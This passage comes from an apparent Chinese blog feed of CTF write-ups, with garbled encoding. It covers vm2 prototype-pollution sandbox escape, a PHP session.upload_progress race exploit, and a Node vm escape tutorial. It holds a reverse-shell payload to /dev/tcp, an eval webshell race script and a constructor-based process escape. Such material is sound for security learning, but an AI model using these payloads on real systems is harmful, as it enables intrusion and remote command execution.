æ²™ç®±é€ƒé€¸ï¼Œå¯ä»¥çœ‹çœ‹è¿™ç¯‡<a href=\"\"> VM æ²™ç®±é€ƒé€¸</a><br>\n app.js çœ‹æºç </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"title function_\">express</span>();</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; <span class=\"variable constant_\">VM</span> &#125; = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;vm2&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">use</span>(express.<span class=\"title function_\">json</span>());</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> backdoor = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title function_\">VM</span>().<span class=\"title function_\">run</span>(&#123;&#125;.<span class=\"property\">shellcode</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class=\"property\">constructor</span> &amp;&amp; obj.<span class=\"property\">constructor</span> === <span class=\"title class_\">Object</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">merge</span> = (<span class=\"params\">a, b</span>) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> attr <span class=\"keyword\">in</span> b) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_\">isObject</span>(a[attr]) &amp;&amp; <span class=\"title function_\">isObject</span>(b[attr])) &#123;</span><br><span class=\"line\">            <span class=\"title function_\">merge</span>(a[attr], b[attr]);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            a[attr] = b[attr];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">clone</span> = (<span class=\"params\">a</span>) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">merge</span>(&#123;&#125;, a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) &#123;</span><br><span class=\"line\">    res.<span class=\"title function_\">send</span>(<span class=\"string\">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(req.<span class=\"property\">body</span>)</span><br><span class=\"line\">        <span class=\"keyword\">var</span> body = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>(<span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(req.<span class=\"property\">body</span>));</span><br><span class=\"line\">        <span class=\"keyword\">var</span> copybody = <span class=\"title function_\">clone</span>(body)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (copybody.<span class=\"property\">shit</span>) &#123;</span><br><span class=\"line\">            <span class=\"title function_\">backdoor</span>()</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        res.<span class=\"title function_\">send</span>(<span class=\"string\">&quot;post shit ok&quot;</span>)</span><br><span class=\"line\">    &#125;<span class=\"keyword\">catch</span>(e)&#123;</span><br><span class=\"line\">        res.<span class=\"title function_\">send</span>(<span class=\"string\">&quot;is it shit ?&quot;</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(e)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">listen</span>(<span class=\"number\">3000</span>, <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>æœ‰ merge åŸå‹é“¾æ±¡æŸ“ï¼Œvm2 æ²™ç®±é€ƒé€¸ï¼Œbackdoor æ–¹æ³• <code>new VM().run(&#123;&#125;.shellcode);</code>  å¯ä»¥åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“åˆ° shellcodeï¼Œè¿›è€Œ rce</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> res = <span class=\"keyword\">import</span>(<span class=\"string\">&#x27;./foo.js&#x27;</span>)</span><br><span class=\"line\">res.<span class=\"property\">toString</span>.<span class=\"title function_\">constructor</span>(<span class=\"params\"><span class=\"string\">&quot;return this&quot;</span></span>)(<span class=\"params\"></span>).<span class=\"property\">process</span>.<span class=\"property\">mainModule</span>.<span class=\"built_in\">require</span>(<span class=\"string\">&quot;child_process&quot;</span>).<span class=\"title function_\">execSync</span>(<span class=\"string\">&quot;whoami&quot;</span>).<span class=\"title function_\">toString</span>();</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;shit&quot;:1,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(\\&quot;return this\\&quot;) ().process.mainModule.require(\\&quot;child_process\\&quot;).execSync(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\&quot;&#x27;).toString();&quot;&#125;&#125; </span><br></pre></td></tr></table></figure>\n<p>æ³¨æ„è¿™é‡Œåå¼¹ shell è¦æœ‰å…¬ç½‘ ip, å…ˆåœ¨è‡ªå·±çš„ vps ä¸Š nc -lvp port<br>\n![[Pasted image 20230511202706.png]]</p>\n<h3 id=\"30ç¬¬äº”ç©ºé—´-2021easycleanup\"><a class=\"markdownIt-Anchor\" href=\"#30ç¬¬äº”ç©ºé—´-2021easycleanup\">#</a> 30.[ç¬¬äº”ç©ºé—´ 2021] EasyCleanup</h3>\n<p>æœ¬é¢˜è€ƒç‚¹ï¼šåˆ©ç”¨ session.upload_progress è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œ<a href=\"\"> è¯¦è§£çœ‹è¿™é‡Œ</a><br>\n fuzz:<br>\nmode=eval&amp;shell=system (â€˜ls /â€™); çœ‹æ ¹ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åï¼Œå‘ç° nssctfasdasdflag, ä½†æ˜¯ shell çš„é•¿åº¦ä¸èƒ½è¶…è¿‡ 15 æˆ–è€…ä¼  file åŒ…å«ä½†æ˜¯é•¿åº¦ä¹Ÿä¸èƒ½è¶…è¿‡ 15, è€Œ nssctfasdasdflag çš„é•¿åº¦æ˜¯ 16</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> io  </span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">import</span> threading  </span><br><span class=\"line\">sessid = <span class=\"string\">&#x27;TGAO&#x27;</span>  </span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;cmd&quot;</span>:<span class=\"string\">&quot;system(&#x27;cat /nssctfasdasdflag&#x27;);&quot;</span>&#125; <span class=\"comment\">#æ­¤å¤„å¯ä»¥æ‰§è¡Œä»»ä½•ç³»ç»Ÿå‘½ä»¤ </span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">session</span>):  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\">f = io.BytesIO(<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">1024</span> * <span class=\"number\">50</span>)  </span><br><span class=\"line\">resp = session.post( <span class=\"string\">&#x27;http://node4.anna.nssctf.cn:28832/&#x27;</span>, data=&#123;<span class=\"string\">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class=\"string\">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class=\"string\">&#x27;file&#x27;</span>: (<span class=\"string\">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class=\"string\">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read</span>(<span class=\"params\">session</span>):  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\">resp = session.post(<span class=\"string\">&#x27;http://node4.anna.nssctf.cn:28832/?file=/tmp/sess_&#x27;</span>+sessid,data=data)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;tgao.txt&#x27;</span> <span class=\"keyword\">in</span> resp.text:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(resp.text)  </span><br><span class=\"line\">event.clear()  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+++++++++++++]retry&quot;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&quot;__main__&quot;</span>:  </span><br><span class=\"line\">event=threading.Event()  </span><br><span class=\"line\"><span class=\"keyword\">with</span> requests.session() <span class=\"keyword\">as</span> session:  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">30</span>):  </span><br><span class=\"line\">threading.Thread(target=write,args=(session,)).start()  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">30</span>):  </span><br><span class=\"line\">threading.Thread(target=read,args=(session,)).start()  </span><br><span class=\"line\">event.<span class=\"built_in\">set</span>()</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/",
            "url": "https://hq185187.github.io/2023/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/",
            "title": "æ²™ç®±é€ƒé€¸åˆå­¦ä¹ ",
            "date_published": "2023-05-12T08:09:54.871Z",
            "content_html": "<h2 id=\"åˆè¯†\"><a class=\"markdownIt-Anchor\" href=\"#åˆè¯†\">#</a> åˆè¯†</h2>\n<ul>\n<li>JavaScript å’Œ nodejs çš„åŒºåˆ«ï¼šJavaScript æ˜¯å‰ç«¯è¯­è¨€ï¼Œåæ¥å°† Chrome ä¸­çš„ v8 å¼•æ“å•ç‹¬æ‹¿å‡ºæ¥ä¸º JavaScript å•ç‹¬å¼€å‘äº†ä¸€ä¸ªè¿è¡Œç¯å¢ƒï¼Œå› æ­¤ JavaScript ä¹Ÿå¯ä»¥ä½œä¸ºä¸€é—¨åç«¯è¯­è¨€ï¼Œå†™åœ¨åç«¯ï¼ˆæœåŠ¡ç«¯ï¼‰çš„ JavaScript å°±å«å«åš Nodejsã€‚</li>\n<li>æ²™ç®±ï¼šå•ç‹¬å¼€è¾Ÿä¸€ä¸ªè¿è¡Œä»£ç çš„ç¯å¢ƒï¼Œä¸ä¸»æœºéš”ç¦»ï¼Œå¯ç”¨æ¥è¿è¡Œå±é™©ä»£ç ä¸”ä¸å½±å“ä¸»æœºï¼Œä¾é é‡å®šå‘å°†ä»£ç é‡å®šå‘åˆ°æ²™ç®±å†…éƒ¨</li>\n<li>æ²™ç®±ï¼ˆsandboxï¼‰å’Œ è™šæ‹Ÿæœºï¼ˆVMï¼‰å’Œ å®¹å™¨ï¼ˆDockerï¼‰ä¹‹é—´çš„åŒºåˆ«ï¼šsandbox å’Œ VM ä½¿ç”¨çš„éƒ½æ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œä½†äºŒè€…é—´ä½¿ç”¨çš„ç›®çš„ä¸ä¸€æ ·ã€‚æ²™ç®±ç”¨æ¥éš”ç¦»æœ‰å®³ç¨‹åºï¼Œè€Œè™šæ‹Ÿæœºåˆ™å®ç°äº†æˆ‘ä»¬åœ¨ä¸€å°ç”µè„‘ä¸Šä½¿ç”¨å¤šä¸ªæ“ä½œç³»ç»Ÿçš„åŠŸèƒ½ã€‚Docker å±äº sandbox çš„ä¸€ç§ï¼Œé€šè¿‡åˆ›é€ ä¸€ä¸ªæœ‰è¾¹ç•Œçš„è¿è¡Œç¯å¢ƒå°†ç¨‹åºæ”¾åœ¨é‡Œé¢ï¼Œä½¿ç¨‹åºè¢«è¾¹ç•Œå›°ä½ï¼Œä»è€Œä½¿ç¨‹åºä¸ç¨‹åºï¼Œç¨‹åºä¸ä¸»æœºä¹‹é—´ç›¸äº’éš”ç¦»å¼€ã€‚</li>\n<li>åœ¨ nodejs ä¸­å¯ä»¥é€šè¿‡ vm æ¨¡å—åˆ›å»ºä¸€ä¸ªæ²™ç®±ä½†æœ‰ç¼ºé™·</li>\n</ul>\n<h2 id=\"nodeå°†å­—ç¬¦ä¸²æ‰§è¡Œä¸ºä»£ç \"><a class=\"markdownIt-Anchor\" href=\"#nodeå°†å­—ç¬¦ä¸²æ‰§è¡Œä¸ºä»£ç \">#</a> node å°†å­—ç¬¦ä¸²æ‰§è¡Œä¸ºä»£ç </h2>\n<h3 id=\"æ–¹æ³•1eval\"><a class=\"markdownIt-Anchor\" href=\"#æ–¹æ³•1eval\">#</a> æ–¹æ³• 1ï¼ševal</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.txt</span><br><span class=\"line\">var name=&#x27;web&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">//1.js</span><br><span class=\"line\">const fs=require(&#x27;fs&#x27;);//é€šè¿‡requireå¼•å…¥fsæ¨¡å—(å†…ç½®æ–‡ä»¶æ“ä½œå‡½æ•°)</span><br><span class=\"line\">let content=fs.readFileSync(&#x27;1.txt&#x27;,&#x27;utf-8&#x27;);</span><br><span class=\"line\">console.log(content);//var name=&#x27;web&#x27;</span><br><span class=\"line\">eval(content);</span><br><span class=\"line\">console.log(name);//web</span><br></pre></td></tr></table></figure>\n<p>æ­¤æ–¹æ³•å¯èƒ½å› ä¸ºä½œç”¨åŸŸåŸå› æŠ¥é”™</p>\n<h3 id=\"æ–¹æ³•2new-function\"><a class=\"markdownIt-Anchor\" href=\"#æ–¹æ³•2new-function\">#</a> æ–¹æ³• 2ï¼šnew function ()</h3>\n<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å½¢å‚åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‡½æ•°ä½“</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var name=&#x27;web&#x27;;</span><br><span class=\"line\">var a=new function(&#x27;name&#x27;,&#x27;return &quot;hello &quot;+name&#x27;);</span><br><span class=\"line\">console.log(a(namme));</span><br><span class=\"line\">//hello web</span><br></pre></td></tr></table></figure>\n<h2 id=\"nodejsä½œç”¨åŸŸ\"><a class=\"markdownIt-Anchor\" href=\"#nodejsä½œç”¨åŸŸ\">#</a> nodejs ä½œç”¨åŸŸ</h2>\n<p>nodejs ä¸­ä½œç”¨åŸŸ 1 å«ä¸Šä¸‹æ–‡<br>\n node é¡¹ç›®ä¸­å¯¼å…¥çš„åŒ…æ˜¯ä¸äº’é€šçš„<br>\n eg, å‡è®¾ 1.js å’Œ 2.js åœ¨åŒä¸€çº§ç›®å½•ä¸‹</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.js</span><br><span class=\"line\">var age=19;</span><br><span class=\"line\">//2.js</span><br><span class=\"line\">const a=require(&#x27;./1.js&#x27;);</span><br><span class=\"line\">console.log(age);</span><br><span class=\"line\">//æ­¤æ—¶ageå€¼ä¸ºundefined</span><br></pre></td></tr></table></figure>\n<ol>\n<li>exports: å°† js æ–‡ä»¶ä¸­çš„å±æ€§è¾“å‡ºçš„æ¥å£</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.js</span><br><span class=\"line\">var age=19;</span><br><span class=\"line\">exports.age=age;</span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶å¯ä»¥è¾“å‡º ageï¼Œå€¼ä¸º 19<br>\n2. å®šä¹‰å…¨å±€å¯¹è±¡ global</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.js</span><br><span class=\"line\">global age=19;</span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶ä¸ç®¡åœ¨å“ªé‡Œ console.log (age) å°±æ˜¯ 19</p>\n<h2 id=\"vmæ²™ç®±é€ƒé€¸\"><a class=\"markdownIt-Anchor\" href=\"#vmæ²™ç®±é€ƒé€¸\">#</a> vm æ²™ç®±é€ƒé€¸</h2>\n<p>å®ç°æ²™ç®±çš„éš”ç¦»æ•ˆæœï¼Œè¦åˆ›å»ºä¸€ä¸ªéš”ç¦»çš„ç¯å¢ƒï¼Œæ­¤æ—¶éœ€è¦ç”¨åˆ° vm æ¨¡å—</p>\n<h3 id=\"å¸¸è§api\"><a class=\"markdownIt-Anchor\" href=\"#å¸¸è§api\">#</a> å¸¸è§ apiï¼š</h3>\n<p>å®˜æ–¹æ–‡æ¡£ï¼š<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubm9kZWFwcC5jbi92bS5odG1sI3ZtX3ZtX2NyZWF0ZWNvbnRleHRfc2FuZGJveA==\">vm</span><br>\nvm.Script ç±»ï¼š</p>\n<ol>\n<li>new  vm.Script (code,options): åˆ›å»ºä¸€ä¸ªæ–°çš„ vm.Script å¯¹è±¡ï¼Œå°†æ¥å—çš„ä»£ç é¢„ç¼–è¯‘ä¸æ‰§è¡Œï¼Œæ­¤<br>\nåå¯è¢«å¤šæ¬¡æ‰§è¡Œ</li>\n<li>script.runInContext (contextifiedSandbox,options), åœ¨æŒ‡å®šçš„ <code>contextifiedSandbox</code>  ä¸­æ‰§è¡Œ <code>vm.Script</code>  å¯¹è±¡ä¸­è¢«ç¼–è¯‘åçš„ä»£ç å¹¶è¿”å›å…¶ç»“æœï¼Œå…¶ä¸­ contextifiedSanbox æ˜¯ç”± vm.createContext è¿”å›çš„å¯¹è±¡</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> util = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;util&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> vm = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;vm&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> sandbox = &#123;</span><br><span class=\"line\">  <span class=\"attr\">animal</span>: <span class=\"string\">&#x27;cat&#x27;</span>,</span><br><span class=\"line\">  <span class=\"attr\">count</span>: <span class=\"number\">2</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> script = <span class=\"keyword\">new</span> vm.<span class=\"title class_\">Script</span>(<span class=\"string\">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> context = vm.<span class=\"title function_\">createContext</span>(sandbox);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ++i) &#123;</span><br><span class=\"line\">  script.<span class=\"title function_\">runInContext</span>(context);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(util.<span class=\"title function_\">inspect</span>(sandbox));</span><br><span class=\"line\"><span class=\"comment\">//&#123;&#x27;animal&#x27;:&#x27;cat&#x27;,&#x27;count&#x27;:12,&#x27;name&#x27;:&#x27;kitty&#x27;&#125;</span></span><br></pre></td></tr></table></figure>\n<p><code>vm.runinThisContext(code)</code> : åœ¨å½“å‰ global ä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸ (sandbox), å°†æ¥æ”¶çš„å‚æ•°å½“åšä»£ç æ‰§è¡Œï¼Œsanbox é‡Œå¯ä»¥è®¿é—®å¤–é¢ global çš„å±æ€§ï¼Œä¸èƒ½è®¿é—®å…¶ä»–åŒ…çš„å±æ€§</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> vm=<span class=\"built_in\">require</span>(<span class=\"string\">&#x27;vm&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> test=<span class=\"string\">&#x27;local&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> vmresult=vm.<span class=\"title function_\">runinThisContext</span>(<span class=\"string\">&#x27;test=&#x27;</span>vm<span class=\"string\">&#x27;;&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(vmresult);<span class=\"comment\">//vm</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(test);<span class=\"comment\">//local</span></span><br></pre></td></tr></table></figure>\n<p><code>vm.createContext([sandbox])</code> ï¼š ç»™å®šä¸€ä¸ª <code>sandbox</code>  å¯¹è±¡ï¼ŒÂ  <code>vm.createContext()</code>  ä¼šè®¾ç½®æ­¤ <code>sandbox</code> ï¼Œä»è€Œè®©å®ƒå…·å¤‡åœ¨ <code>vm.runInContext()</code>  æˆ–è€… <code>script.runInContext()</code>  ä¸­è¢«ä½¿ç”¨çš„èƒ½åŠ›ã€‚</p>\n<p><code>vm.runInContext()</code> : åœ¨æŒ‡å®šçš„ <code>contextifiedSandbox</code>  çš„ä¸Šä¸‹æ–‡é‡Œæ‰§è¡Œ vm.Script å¯¹è±¡ä¸­è¢«ç¼–è¯‘åçš„ä»£ç å¹¶è¿”å›å…¶ç»“æœã€‚è¢«æ‰§è¡Œçš„ä»£ç æ— æ³•è·å–æœ¬åœ°ä½œç”¨åŸŸã€‚</p>\n<h2 id=\"processå®ç°rce\"><a class=\"markdownIt-Anchor\" href=\"#processå®ç°rce\">#</a> process å®ç° rce</h2>\n<p>åœ¨è·å–åˆ° process å¯¹è±¡åæˆ‘ä»¬å°±å¯ä»¥ç”¨ require æ¥å¯¼å…¥ child_processï¼Œå†åˆ©ç”¨ child_process æ‰§è¡Œå‘½ä»¤ã€‚ä½† process æŒ‚è½½åœ¨ global ä¸Šï¼Œä½†æ˜¯æˆ‘ä»¬ä¸Šé¢è¯´äº†åœ¨ <code>creatContext</code>  åæ˜¯ä¸èƒ½è®¿é—®åˆ° global çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡æ˜¯é€šè¿‡å„ç§åŠæ³•å°† global ä¸Šçš„ process å¼•å…¥åˆ°æ²™ç®±ä¸­ã€‚</p>\n<p>vm.runInNewContext( <code>this.constructor.constructor('return process.env')()</code> );</p>\n<p>é‚£ä¹ˆæˆ‘ä»¬æ˜¯æ€ä¹ˆå®ç°é€ƒé€¸çš„å‘¢ï¼Œé¦–å…ˆè¿™é‡Œé¢çš„ this æŒ‡å‘çš„æ˜¯å½“å‰ä¼ é€’ç»™ <code>runInNewContext</code>  çš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸å±äºæ²™ç®±ç¯å¢ƒçš„ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªå¯¹è±¡è·å–åˆ°å®ƒçš„æ„é€ å™¨ï¼Œå†è·å¾—ä¸€ä¸ªæ„é€ å™¨å¯¹è±¡çš„æ„é€ å™¨ï¼ˆæ­¤æ—¶ä¸º Function çš„ constructorï¼‰ï¼Œæœ€åçš„ <code>()</code>  æ˜¯è°ƒç”¨è¿™ä¸ªç”¨ Function çš„ constructor ç”Ÿæˆçš„å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›äº†ä¸€ä¸ª process å¯¹è±¡</p>\n<p>ä¸‹é¢è¿™è¡Œä»£ç ä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const y1 = vm.runInNewContext(this.toString.constructor(&#x27;return 